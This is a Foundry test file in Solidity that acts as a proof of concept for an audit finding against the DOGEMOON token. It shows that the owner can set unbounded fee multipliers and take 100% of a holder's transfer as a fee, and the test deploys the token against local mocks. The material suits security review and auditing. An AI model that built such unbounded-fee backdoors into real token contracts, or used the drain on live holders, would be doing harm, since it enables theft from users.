// SPDX-License-Identifier: MIT
pragma solidity 0.8.4;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/DOGEMOON.sol";

contract DOGEMOONMockRouter {
    address private constant WBNB_ADDR = address(0xBEEF);
    address private constant FACTORY_ADDR = address(0xF00D);

    function WETH() external pure returns (address) {
        return WBNB_ADDR;
    }

    function factory() external pure returns (address) {
        return FACTORY_ADDR;
    }
}

contract DOGEMOONMockFactory {
    address private constant PAIR = address(0xCAFE);

    function createPair(address, address) external pure returns (address) {
        return PAIR;
    }
}

contract DOGEMOONFeeManipulationTest is Test {
    address private constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address private constant MOCK_FACTORY = address(0xF00D);

    DOGEMOON private token;

    function setUp() public {
        // The token constructor hard-codes the PancakeSwap router and immediately
        // calls WETH(), factory(), and createPair(). Install minimal mocks locally
        // so the real DOGEMOON contract can be deployed without a BSC fork.
        DOGEMOONMockRouter routerMock = new DOGEMOONMockRouter();
        vm.etch(PANCAKE_ROUTER, address(routerMock).code);

        DOGEMOONMockFactory factoryMock = new DOGEMOONMockFactory();
        vm.etch(MOCK_FACTORY, address(factoryMock).code);

        token = new DOGEMOON();
    }

    function _triggerAndCheckMultipliers() internal returns (bool) {
        console.log("=== (i) BEFORE-Trigger: multiplier state snapshot ===");
        uint256 buyBefore = token.buyMultiplier();
        uint256 sellBefore = token.sellMultiplier();
        uint256 transferBefore = token.transferMultiplier();
        console.log("buyMultiplier before      :", buyBefore);
        console.log("sellMultiplier before     :", sellBefore);
        console.log("transferMultiplier before :", transferBefore);

        console.log("=== (ii) TRIGGER: owner calls set_multipliers(1000, 1000, 1000) ===");
        token.set_multipliers(1000, 1000, 1000);

        console.log("=== (iii) AFTER-Trigger: multiplier state snapshot ===");
        uint256 buyAfter = token.buyMultiplier();
        uint256 sellAfter = token.sellMultiplier();
        uint256 transferAfter = token.transferMultiplier();
        console.log("buyMultiplier after       :", buyAfter);
        console.log("sellMultiplier after      :", sellAfter);
        console.log("transferMultiplier after  :", transferAfter);

        bool changed = (buyAfter != buyBefore) || (sellAfter != sellBefore) || (transferAfter != transferBefore);
        bool unbounded = (buyAfter == 1000) && (sellAfter == 1000) && (transferAfter == 1000);

        console.log("=== (iv) COMPARISON: multipliers ===");
        console.log("multiplier state changed  :", changed);
        console.log("values are unbounded(1000):", unbounded);

        return changed && unbounded;
    }

    function _executeDrainAndCheck(address alice, address bob, uint256 amount) internal returns (bool) {
        console.log("=== PoC ACTION: fund alice, then execute the attacker's fee-drain transfer ===");
        require(token.transfer(alice, amount), "funding transfer failed");

        uint256 aliceBalance = token.balanceOf(alice);
        uint256 contractBefore = token.balanceOf(address(token));

        console.log("alice balance after funding:", aliceBalance);
        console.log("token contract balance before transfer:", contractBefore);

        vm.prank(alice);
        bool transferOk = token.transfer(bob, aliceBalance);

        uint256 aliceFinal = token.balanceOf(alice);
        uint256 bobFinal = token.balanceOf(bob);
        uint256 contractAfter = token.balanceOf(address(token));
        uint256 feeTaken = contractAfter - contractBefore;

        console.log("alice final balance       :", aliceFinal);
        console.log("bob final balance         :", bobFinal);
        console.log("fee taken by token        :", feeTaken);

        return transferOk && (aliceFinal == 0) && (bobFinal == 0) && (feeTaken == aliceBalance);
    }

    function testOwnerCanSetUnboundedMultipliersAndTakeExcessiveFee() public {
        // Base fee: 10%. With multiplier 1000, the effective transfer fee is 100%.
        token.setFees(10, 0, 0, 0, 0, 100);
        token.setSwapBackSettings(false, 0);

        address alice = address(0xA11CE);
        address bob = address(0xB0B);

        token.setIsTxLimitExempt(alice, true);
        token.setIsTxLimitExempt(bob, true);
        token.tradingStatus(true, 0);

        bool multipliersUnbounded = _triggerAndCheckMultipliers();

        uint256 amount = token.balanceOf(address(this)) / 100;
        require(amount > 0, "amount is zero");

        bool drainObserved = _executeDrainAndCheck(alice, bob, amount);

        if (multipliersUnbounded && drainObserved) {
            console.log("Vulnerability Exists: set_multipliers accepted values of 1000 for buy/sell/transfer without a bound, and the subsequent transfer moved the entire amount into the token contract as a 100% fee.");
        } else {
            console.log("Vulnerability not Exist: the multiplier values were not changed to unbounded values or the excessive-fee transfer did not occur.");
        }
    }
}